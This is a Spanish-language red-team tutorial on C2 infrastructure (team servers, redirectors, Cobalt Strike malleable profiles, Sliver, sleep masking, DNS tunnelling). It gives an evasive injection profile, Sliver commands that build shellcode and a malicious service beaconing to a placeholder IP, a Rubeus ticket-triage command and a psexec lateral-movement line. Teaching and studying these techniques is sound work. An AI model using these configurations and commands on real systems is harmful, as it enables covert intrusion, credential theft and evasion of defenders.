01. Anatomía Técnica de la Infraestructura C2

"El C2 es el sistema nervioso de una intrusión. Sin una comunicación robusta, la operación muere."

A. Team Server: El Cerebro

A diferencia de una simple shell reversa, el Team Server gestiona el estado de múltiples agentes. Implementa bases de datos para persistir logs, gestionar la compartición de sesiones entre varios operadores y actuar como repositorio de artefactos maliciosos.

B. El Implante (Beacon/Sliver): El Huésped

Es código altamente optimizado (a menudo escrito en C o Go) que se inyecta en la memoria del host. No utiliza sockets persistentes para evitar detecciones de red por "long-lived connections", sino que emplea el **Beaconing**: conexiones cortas e intermitentes para solicitar comandos.

C. Redirectores Multicapa

Para proteger el Team Server (que contiene toda la inteligencia de la operación), se sitúan **Redirectores** (Nginx/Apache). Estos filtran peticiones basándose en el User-Agent o encabezados HTTP específicos, redirigiendo a los analistas de seguridad a una web legítima y a los agentes al Team Server real.

02. Cobalt Strike: Dominio de Perfiles Maleables

La potencia de Cobalt Strike reside en su capacidad de **Mimetismo**. Un analista de Blue Team que no encuentre un patrón conocido no generará una alerta.

A. Estructura de un Perfil Maleable

El perfil define cómo el Beacon se comporta en la red y en la memoria. Parámetros como sleep y jitter controlan el tiempo, mientras que http-stager define cómo se descarga el payload inicial.

Malleable C2 Profile
set sleep "30000"; # 30 segundos
set jitter "20";    # +/- 20% de variabilidad

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "16384";
    set userwx    "false"; # Evita páginas de memoria con permisos Read-Write-Execute (RWX)
}

stage {
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...";
    set cleanup   "true"; # Borra el stager de la memoria tras ejecución
}

B. Comandos de Post-Explotación Avanzada

# Enumeración de red sin tocar el disco (usando .NET en memoria)

03. Sliver C2: El Arsenal Moderno

Sliver es disruptivo porque implementa **mTLS** por defecto, asegurando que ni siquiera un analista con un Proxy SSL pueda interceptar los comandos entre el servidor y el agente.

A. Generación de Cargas Útiles Complejas

Sliver permite generar no solo ejecutables, sino también **Shellcodes** para inyectar en otros procesos o servicios de Windows para persistencia sigilosa.

Sliver CLI
# Generar shellcode para inyección remota
generate --mtls 1.2.3.4 --format shellcode --save ./sc.bin

# Generar un servicio de Windows malicioso
generate --http 1.2.3.4 --as-service --save ./svc.exe

B. El "Armory" y Extensiones

Sliver posee un sistema de extensiones llamado **Armory**. Permite descargar dinámicamente herramientas como Mimikatz, Rubeus o BloodHound directamente a la sesión del agente sin que toquen el disco duro de la víctima.

Sliver Session
# Instalar y ejecutar una extensión del Armory
armory install ghostpack
rubeus -command "triage"

# Movimiento lateral mediante WMI
psexec -u [user] -p [pass] -d [binary_path] [target_ip]

04. Sigilo de Memoria: Sleep Masking

Los EDRs modernos escanean la memoria RAM buscando patrones de C2 conocidos mientras el agente está "durmiendo".

A. ¿Qué es el Sleep Masking?

Es una técnica donde el agente **se cifra a sí mismo** justo antes de entrar en el estado de "Sleep". Cuando despierta, se descifra, ejecuta los comandos recibidos y vuelve a cifrarse. Esto hace que las firmas estáticas en memoria sean inútiles.

B. Call Stack Spoofing

Los agentes C2 suelen tener un "Call Stack" (pila de llamadas) que delata que han sido inyectados (por ejemplo, llamadas a funciones de red que provienen de regiones de memoria desconocidas). El **Spoofing** falsea esta pila para que parezca que las peticiones provienen de DLLs legítimas de Windows como kernel32.dll.

05. Protocolos de Transporte y Tunelización

Un C2 profesional debe ser capaz de "hablar" múltiples protocolos para adaptarse a las restricciones del entorno.

DNS Tunneling

"El puerto 53 casi siempre está abierto."

Los datos se envían en subdominios de peticiones DNS TXT. Es lento pero extremadamente difícil de bloquear sin romper la navegación de la empresa.

HTTP/2 y TLS 1.3

"Escondido en el tráfico web."

Utiliza cifrado de última generación y multiplexación para que el tráfico parezca una sesión de navegación normal hacia un servicio en la nube.
